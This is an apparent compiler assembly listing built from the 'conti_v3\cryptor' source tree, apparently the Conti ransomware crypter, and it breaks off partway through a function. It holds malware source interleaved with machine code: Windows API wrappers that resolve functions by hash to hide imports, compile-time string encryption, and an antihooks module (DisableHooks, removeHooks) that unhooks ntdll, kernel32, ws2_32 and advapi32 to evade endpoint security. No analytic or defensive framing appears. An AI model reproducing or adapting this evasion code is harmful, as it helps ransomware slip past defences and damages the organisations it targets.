;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z DD 060f01H
	DD	0b640fH
	DD	0a340fH
	DD	0700b720fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCloseHandle@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apVirtualProtect@@YAHPEAX_KKPEAK@Z DD 060f01H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?DisableHooks@@YAXXZ DD 0a1901H
	DD	01b0119H
	DD	0e00bf00dH
	DD	0c007d009H
	DD	060047005H
	DD	050023003H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Rva2Offset@@YAKK_K@Z DD 020501H
	DD	013405H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 020021H
	DD	0596400H
	DD	imagerel $LN176
	DD	imagerel $LN176+385
	DD	imagerel $unwind$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 021H
	DD	imagerel $LN176
	DD	imagerel $LN176+385
	DD	imagerel $unwind$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 021H
	DD	imagerel $LN176+385
	DD	imagerel $LN176+590
	DD	imagerel $chain$0$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 082021H
	DD	052f420H
	DD	053e418H
	DD	05bd410H
	DD	05ac408H
	DD	imagerel $LN176+385
	DD	imagerel $LN176+590
	DD	imagerel $chain$0$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 020821H
	DD	0596408H
	DD	imagerel $LN176
	DD	imagerel $LN176+385
	DD	imagerel $unwind$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD 052419H
	DD	0540113H
	DD	030037004H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0280H
xdata	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 8
n$dead$ = 16
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

  00000	44 8b c9	 mov	 r9d, ecx

; 40   :     return (a % n + n) % n;

  00003	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00008	f7 e9		 imul	 ecx
  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	03 d1		 add	 edx, ecx
  00011	c1 fa 06	 sar	 edx, 6
  00014	44 8b c2	 mov	 r8d, edx
  00017	41 c1 e8 1f	 shr	 r8d, 31
  0001b	41 03 d0	 add	 edx, r8d
  0001e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00021	44 2b c9	 sub	 r9d, ecx
  00024	41 83 c1 7f	 add	 r9d, 127		; 0000007fH
  00028	41 f7 e9	 imul	 r9d
  0002b	41 03 d1	 add	 edx, r9d
  0002e	c1 fa 06	 sar	 edx, 6
  00031	8b c2		 mov	 eax, edx
  00033	c1 e8 1f	 shr	 eax, 31
  00036	03 d0		 add	 edx, eax
  00038	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0003b	44 2b c8	 sub	 r9d, eax
  0003e	41 8b c1	 mov	 eax, r9d

; 41   : }

  00041	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z
_TEXT	SEGMENT
hFile$ = 48
lpFileSize$ = 56
?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z PROC	; pGetFileSizeEx, COMDAT

; 100  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 101  : 	BOOL(WINAPI * pFunction)(HANDLE, PLARGE_INTEGER);
; 102  : 	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x43ba1ffb, 104);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));

  0000d	41 b8 fb 1f ba
	43		 mov	 r8d, 1136271355		; 43ba1ffbH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 59	 lea	 r9d, QWORD PTR [rdx+89]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 103  : 	return pFunction(hFile, lpFileSize);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 104  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 103  : 	return pFunction(hFile, lpFileSize);

  00034	48 ff e0	 rex_jmp rax
?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z ENDP	; pGetFileSizeEx
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z
_TEXT	SEGMENT
lpFileName$ = 80
dwDesiredAccess$ = 88
dwShareMode$ = 96
lpSecurityAttributes$dead$ = 104
dwCreationDisposition$ = 112
dwFlagsAndAttributes$ = 120
hTemplateFile$dead$ = 128
?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z PROC ; pCreateFileW, COMDAT

; 172  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  0000f	8b fa		 mov	 edi, edx
  00011	41 8b d8	 mov	 ebx, r8d

; 173  : 	HANDLE(WINAPI * pFunction)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  00014	ba 0f 00 00 00	 mov	 edx, 15
  00019	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  0001f	48 8b f1	 mov	 rsi, rcx
  00022	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  00026	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  0002b	44 8b c3	 mov	 r8d, ebx
  0002e	48 c7 84 24 80
	00 00 00 00 00
	00 00		 mov	 QWORD PTR hTemplateFile$dead$[rsp], 0
  0003a	8b d7		 mov	 edx, edi
  0003c	48 8b ce	 mov	 rcx, rsi
  0003f	44 8b 4c 24 70	 mov	 r9d, DWORD PTR dwCreationDisposition$[rsp]
  00044	45 33 c9	 xor	 r9d, r9d

; 176  : }

  00047	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  0004c	48 8b 74 24 58	 mov	 rsi, QWORD PTR [rsp+88]
  00051	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00055	5f		 pop	 rdi

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00056	48 ff e0	 rex_jmp rax
?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z ENDP ; pCreateFileW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCloseHandle@@YAHPEAX@Z
_TEXT	SEGMENT
hObject$ = 48
?pCloseHandle@@YAHPEAX@Z PROC				; pCloseHandle, COMDAT

; 226  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 227  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  0001d	48 8b cb	 mov	 rcx, rbx

; 230  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 229  : 	return pFunction(hObject);

  00025	48 ff e0	 rex_jmp rax
?pCloseHandle@@YAHPEAX@Z ENDP				; pCloseHandle
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z
_TEXT	SEGMENT
hModule$ = 48
lpFilename$ = 56
nSize$dead$ = 64
?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z PROC ; apGetModuleFileNameW, COMDAT

; 1203 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 1204 : 	DWORD(WINAPI * pFunction)(HMODULE, LPWSTR, DWORD);
; 1205 : 	pFunction = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xebd9a617, 8);

  0000d	41 b8 17 a6 d9
	eb		 mov	 r8d, -338057705		; ebd9a617H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a f9	 lea	 r9d, QWORD PTR [rdx-7]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1206 : 	return pFunction(hModule, lpFilename, nSize);

  00024	41 b8 04 01 00
	00		 mov	 r8d, 260		; 00000104H
  0002a	48 8b d3	 mov	 rdx, rbx
  0002d	48 8b cf	 mov	 rcx, rdi

; 1207 : }

  00030	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00035	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00039	5f		 pop	 rdi

; 1206 : 	return pFunction(hModule, lpFilename, nSize);

  0003a	48 ff e0	 rex_jmp rax
?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z ENDP ; apGetModuleFileNameW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z
_TEXT	SEGMENT
hFile$ = 64
lpFileMappingAttributes$dead$ = 72
flProtect$dead$ = 80
dwMaximumSizeHigh$dead$ = 88
dwMaximumSizeLow$dead$ = 96
lpName$dead$ = 104
?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z PROC ; apCreateFileMappingW, COMDAT

; 1220 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 1221 : 	HANDLE(WINAPI * pFunction)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
; 1222 : 	pFunction = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x90b93fda, 7);

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 da 3f b9
	90		 mov	 r8d, -1866907686	; 90b93fdaH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a f8	 lea	 r9d, QWORD PTR [rdx-8]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1223 : 	return pFunction(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);

  0001d	33 c9		 xor	 ecx, ecx
  0001f	45 33 c9	 xor	 r9d, r9d
  00022	48 89 4c 24 68	 mov	 QWORD PTR lpName$dead$[rsp], rcx
  00027	33 d2		 xor	 edx, edx
  00029	89 4c 24 60	 mov	 DWORD PTR dwMaximumSizeLow$dead$[rsp], ecx
  0002d	44 8d 41 02	 lea	 r8d, QWORD PTR [rcx+2]
  00031	48 8b cb	 mov	 rcx, rbx

; 1224 : }

  00034	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00038	5b		 pop	 rbx

; 1223 : 	return pFunction(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);

  00039	48 ff e0	 rex_jmp rax
?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z ENDP ; apCreateFileMappingW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z
_TEXT	SEGMENT
hFileMappingObject$ = 64
dwDesiredAccess$dead$ = 72
dwFileOffsetHigh$dead$ = 80
dwFileOffsetLow$dead$ = 88
dwNumberOfBytesToMap$ = 96
?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z PROC		; apMapViewOfFile, COMDAT

; 1236 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 1237 : 	LPVOID(WINAPI * pFunction)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
; 1238 : 	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x0ab3c572, 6);

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 72 c5 b3
	0a		 mov	 r8d, 179553650		; 0ab3c572H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a f7	 lea	 r9d, QWORD PTR [rdx-9]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1239 : 	return pFunction(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);

  0001d	45 33 c9	 xor	 r9d, r9d
  00020	45 33 c0	 xor	 r8d, r8d
  00023	48 8b cb	 mov	 rcx, rbx
  00026	41 8d 51 04	 lea	 edx, QWORD PTR [r9+4]

; 1240 : }

  0002a	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0002e	5b		 pop	 rbx

; 1239 : 	return pFunction(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);

  0002f	48 ff e0	 rex_jmp rax
?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z ENDP		; apMapViewOfFile
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apVirtualProtect@@YAHPEAX_KKPEAK@Z
_TEXT	SEGMENT
lpAddress$ = 48
dwSize$dead$ = 56
flNewProtect$ = 64
lpflOldProtect$ = 72
?apVirtualProtect@@YAHPEAX_KKPEAK@Z PROC		; apVirtualProtect, COMDAT

; 1251 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1252 : 	BOOL(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, PDWORD);
; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  0000f	ba 0f 00 00 00	 mov	 edx, 15
  00014	49 8b d9	 mov	 rbx, r9
  00017	41 8b f8	 mov	 edi, r8d
  0001a	48 8b f1	 mov	 rsi, rcx
  0001d	41 b8 a5 e8 a7
	00		 mov	 r8d, 11004069		; 00a7e8a5H
  00023	44 8d 4a f6	 lea	 r9d, QWORD PTR [rdx-10]
  00027	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1254 : 	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);

  0002c	4c 8b cb	 mov	 r9, rbx
  0002f	44 8b c7	 mov	 r8d, edi
  00032	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  00037	48 8b ce	 mov	 rcx, rsi

; 1255 : }

  0003a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0003f	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00044	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00048	5f		 pop	 rdi

; 1254 : 	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);

  00049	48 ff e0	 rex_jmp rax
?apVirtualProtect@@YAHPEAX_KKPEAK@Z ENDP		; apVirtualProtect
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z
_TEXT	SEGMENT
lpLibFileName$ = 48
?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z PROC		; apLoadLibraryA, COMDAT

; 1263 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1264 : 	HMODULE(WINAPI * pFunction)(LPCSTR);
; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  0001d	48 8b cb	 mov	 rcx, rbx

; 1267 : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 1266 : 	return pFunction(lpLibFileName);

  00025	48 ff e0	 rex_jmp rax
?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z ENDP		; apLoadLibraryA
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z
_TEXT	SEGMENT
hModule$ = 48
lpProcName$ = 56
?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z PROC ; apGetProcAddress, COMDAT

; 1276 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 1277 : 	FARPROC(WINAPI * pFunction)(HMODULE, LPCSTR);
; 1278 : 	pFunction = (FARPROC(WINAPI*)(HMODULE, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb6a6d4a2, 3);

  0000d	41 b8 a2 d4 a6
	b6		 mov	 r8d, -1230580574	; b6a6d4a2H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a f4	 lea	 r9d, QWORD PTR [rdx-12]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1279 : 	return pFunction(hModule, lpProcName);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 1280 : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 1279 : 	return pFunction(hModule, lpProcName);

  00034	48 ff e0	 rex_jmp rax
?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z ENDP ; apGetProcAddress
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?DisableHooks@@YAXXZ
_TEXT	SEGMENT
$T4 = 32
$T6 = 48
$T2 = 64
$T10 = 80
$T11 = 96
$T1 = 112
$T3 = 128
$T5 = 144
$T7 = 160
$T8 = 176
$T9 = 192
hKernel32$1$ = 288
hWs2_32$1$ = 296
hAdvapi32$1$ = 304
hNtdll$1$ = 312
?DisableHooks@@YAXXZ PROC				; DisableHooks, COMDAT

; 15   : {

$LN523:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	56		 push	 rsi
  00004	57		 push	 rdi
  00005	41 54		 push	 r12
  00007	41 55		 push	 r13
  00009	41 56		 push	 r14
  0000b	41 57		 push	 r15
  0000d	48 8d 6c 24 e1	 lea	 rbp, QWORD PTR [rsp-31]
  00012	48 81 ec d8 00
	00 00		 sub	 rsp, 216		; 000000d8H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00019	c6 45 b7 00	 mov	 BYTE PTR $T1[rbp-185], 0

; 63   :         if (!isDecrypted())

  0001d	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0001f	c6 45 b8 54	 mov	 BYTE PTR $T1[rbp-184], 84 ; 00000054H
  00023	c6 45 b9 36	 mov	 BYTE PTR $T1[rbp-183], 54 ; 00000036H
  00027	c6 45 ba 77	 mov	 BYTE PTR $T1[rbp-182], 119 ; 00000077H
  0002b	c6 45 bb 63	 mov	 BYTE PTR $T1[rbp-181], 99 ; 00000063H
  0002f	c6 45 bc 36	 mov	 BYTE PTR $T1[rbp-180], 54 ; 00000036H
  00033	c6 45 bd 59	 mov	 BYTE PTR $T1[rbp-179], 89 ; 00000059H
  00037	c6 45 be 3a	 mov	 BYTE PTR $T1[rbp-178], 58 ; 0000003aH
  0003b	c6 45 bf 35	 mov	 BYTE PTR $T1[rbp-177], 53 ; 00000035H
  0003f	c6 45 c0 21	 mov	 BYTE PTR $T1[rbp-176], 33 ; 00000021H
  00043	c6 45 c1 31	 mov	 BYTE PTR $T1[rbp-175], 49 ; 00000031H
  00047	c6 45 c2 59	 mov	 BYTE PTR $T1[rbp-174], 89 ; 00000059H
